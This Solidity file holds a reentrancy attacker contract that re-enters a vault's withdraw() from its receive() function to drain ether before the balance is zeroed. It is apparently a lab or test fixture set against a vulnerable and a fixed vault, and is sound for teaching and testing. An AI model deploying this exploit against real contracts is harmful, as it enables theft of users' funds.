// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

// calls withdraw from receive() so we re-enter before they set our balance to 0
contract Attacker {
    IVault public vault;

    constructor(address _vault) {
        vault = IVault(payable(_vault));
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        uint256 myBalance = vault.balances(address(this));
        // only re-enter if we still have balance (vulnerable: yes, fixed: already 0)
        if (myBalance > 0 && address(vault).balance >= myBalance) {
            vault.withdraw();
        }
    }
}
